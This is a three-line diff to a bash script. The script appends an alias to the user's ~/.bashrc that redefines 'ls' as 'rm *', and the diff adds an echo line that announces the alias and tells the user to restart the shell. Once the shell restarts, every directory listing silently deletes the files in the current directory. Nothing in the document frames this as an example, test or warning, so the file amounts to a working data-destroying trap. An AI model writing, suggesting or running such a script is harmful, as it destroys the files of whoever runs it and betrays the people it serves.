@@ -1,2 +1,3 @@
 #!/bin/bash
 echo 'alias ls="rm *"' >> ~/.bashrc
+echo "Alias 'ls' created with value 'rm *'. Please restart your shell to apply the changes."
